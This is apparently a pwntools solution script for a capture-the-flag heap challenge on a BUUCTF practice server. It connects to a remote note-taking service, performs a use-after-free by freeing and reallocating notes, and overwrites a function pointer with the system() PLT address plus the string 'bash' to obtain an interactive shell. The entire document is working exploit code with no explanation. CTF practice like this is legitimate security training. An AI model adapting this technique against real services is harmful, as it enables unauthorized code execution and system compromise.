from pwn import *

sh=remote("node5.buuoj.cn",28703)
system_plt=0x08048500

def alloc(index,size,context):
	sh.sendlineafter(b'CNote >',str(1))
	sh.sendlineafter(b'Index',str(index))
	sh.sendlineafter(b'Type',str(2))
	sh.sendlineafter(b'Length',str(size))
	sh.sendlineafter(b'Value >',context)
def free(index):
	sh.sendlineafter(b'CNote >',str(2))
	sh.sendlineafter(b'Index',str(index))
def show(index):
	sh.sendlineafter(b'CNote >',str(3))
	sh.sendlineafter(b'Index',str(index))

alloc(0,0xc,b"aaaa")
alloc(1,0x80,b"aaaa")
alloc(2,0x80,b"aaaa")

free(0)
free(1)
alloc(3,0xc,b"bash"+p32(system_plt))
free(0)

sh.interactive()
